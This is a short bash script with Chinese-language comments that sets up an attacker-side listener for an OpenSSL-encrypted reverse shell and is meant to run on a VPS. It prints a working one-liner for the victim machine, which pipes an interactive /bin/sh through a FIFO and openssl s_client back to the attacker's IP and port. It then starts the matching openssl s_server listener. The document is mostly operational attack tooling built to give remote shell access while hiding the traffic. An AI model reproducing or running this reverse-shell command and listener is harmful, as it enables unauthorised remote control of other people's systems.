#!/bin/bash
# by 清晨

echo -e "\033[32m \033[1m"
echo -e "\033[32m***************该脚本为openssl加密反弹shell流量的使用脚本 请在VPS上使用***************\033[1m"
echo -e "\033[32m \033[0m"

if [ -f "key.pem" ] && [ -f "cert.pem" ];then

	if [ "$1" == "" ] && [ "$2" == "" ] ;then
		echo -e "\033[31m[-] Error!\033[0m"
		echo -e "\033[34m[*] 脚本使用方法：bash listen.sh 本机IP 监听端口\033[0m"
		exit 1
	fi
	echo -e "\033[32m \033[1m"
	echo -e "\033[32m[+] 反弹shell脚本已执行！\n\033[1m"
	echo -e "\033[34m[*] 目标机器上执行：mkfifo /tmp/qc; /bin/sh -i < /tmp/qc 2>&1 | openssl s_client -quiet -connect ${1}:${2}> /tmp/qc; rm /tmp/qc \033[0m"
	echo -e "\033[32m \033[0m"
	openssl s_server -quiet -key key.pem -cert cert.pem -port $2
else
	echo -e "\033[31m[-] 没有找到key.pem文件或cert.pem文件。\033[0m"
	echo -e "\033[34m[*] 请执行以下命令创建证书文件后在执行该脚本！\033[0m"
	echo -e "\033[34m[*] openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes \033[0m"
fi